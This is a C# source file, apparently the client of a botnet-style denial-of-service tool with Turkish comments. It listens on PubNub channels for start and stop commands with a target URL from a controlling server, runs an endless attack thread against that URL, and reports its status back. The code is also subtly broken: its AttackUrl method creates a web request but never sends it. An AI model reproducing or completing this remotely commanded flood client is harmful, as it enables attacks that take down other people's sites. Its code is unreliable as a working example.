using AtackerDTO;
using AttackerCommon;
using ChannelController;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PubnubApi;
using System.Threading;
using System.Net;

namespace AttackerClient
{
    class ClientController
    {
        static Thread trdAttack = null;

        /// <summary>
        /// Mesaj yayınlar
        /// </summary>
        /// <param name="pubnub"></param>
        /// <param name="SenderId"></param>
        /// <param name="Status"></param>
        /// <param name="Data"></param>
        public static void PublishStatusMessage(Pubnub pubnub, string SenderId, ref ClientStatusType Status, ref string Data)
        {
            Publisher publisher = new Publisher(pubnub);

            MessageType messageType;

            switch (Status)
            {
                case ClientStatusType.Normal:
                    messageType = MessageType.ClientStatus;
                    break;
                case ClientStatusType.Message:
                    messageType = MessageType.TextToServers;
                    break;
                case ClientStatusType.Error:
                    messageType = MessageType.ClientError;
                    break;
                case ClientStatusType.Attacking:
                    messageType = MessageType.ClientAttacking;
                    break;
                default:
                    messageType = MessageType.ClientStatus;
                    break;
            }

            WriteMessage($"messageType: {messageType.ToString()} Publishing");

            publisher.PublishMessage(new MessageDTO(messageType, SenderId, Data), (isError, errorMessage) =>
            {
                if (!isError)
                {
                    WriteMessage($"messageType: {messageType.ToString()} Published");
                }
                else
                {
                    WriteMessage($"messageType: {messageType.ToString()} Error!: " + errorMessage);
                }

                return !isError;
            });
        }

        /// <summary>
        /// Gönderilen mesajı yorumlar ve gereken işlemi başlatır
        /// </summary>
        /// <param name="message"></param>
        /// <param name="pubnub"></param>
        /// <param name="SenderId"></param>
        /// <param name="Status"></param>
        /// <param name="Data"></param>
        public static void HandleMessage(MessageDTO message, Pubnub pubnub, string SenderId, ref ClientStatusType Status, ref string Data)
        {
            /*
             Eğer client tarafından karşılanan bir mesaj ise bu değer true yapılır
             */
            bool isHandled = false;

            switch (message.MessageType)
            {
                case MessageType.TextToClients:
                    WriteMessage(message.Data);
                    isHandled = true;
                    break;
                case MessageType.StartAttack:
                    StartAttack(ref Status, ref Data, message.Data);
                    isHandled = true;
                    break;
                case MessageType.StopAttack:
                    StopAttack(ref Status, ref Data);
                    isHandled = true;
                    break;
                default:
                    break;
            }

            //Eğer mesaj handle edildiyse son durum server ile paylaşılıyor
            if (isHandled)
            {
                PublishStatusMessage(pubnub, SenderId, ref Status, ref Data);
            }
        }

        /// <summary>
        /// Saldırıyı başlatır
        /// </summary>
        /// <param name="url"></param>
        private static void StartAttack(ref ClientStatusType Status, ref string Data, string url)
        {
            Status = ClientStatusType.Attacking;
            Data = url;

            if (trdAttack == null)
            {
                trdAttack = new Thread(() =>
                {
                    try
                    {
                        int i = 0;
                        while (true)
                        {
                            i++;

                            if (i % 10000 == 0)
                            {
                                WriteMessage("Attacking: " + i.ToString());
                                WriteMessage("Url: " + url);
                                AttackUrl(url);
                            }
                        }
                    }
                    catch (Exception ee)
                    {
                        WriteMessage("Error: " + ee.Message);
                    }
                });
                trdAttack.Start();
            }
            else if (!trdAttack.IsAlive)
            {
                trdAttack.Start();
            }

            WriteMessage("Attacking started to " + url);
        }

        /// <summary>
        /// Saldırı yaparr
        /// </summary>
        /// <param name="uri"></param>
        private static void AttackUrl(string uri)
        {
            WebRequest webRequest = HttpWebRequest.Create(uri);
        }

        /// <summary>
        /// Saldırıyı durdurur
        /// </summary>
        /// <param name="url"></param>
        private static void StopAttack(ref ClientStatusType Status, ref string Data)
        {
            Status = ClientStatusType.Normal;
            Data = String.Empty;

            if (trdAttack != null)
            {
                trdAttack.Abort();
                trdAttack = null;
            }

            WriteMessage("Attacking stopped");
        }

        /// <summary>
        /// Ekrana mesajı yazar
        /// </summary>
        /// <param name="message"></param>
        private static void WriteMessage(string message)
        {
#if DEBUG
            Console.WriteLine(message);
#endif
        }
    }
}
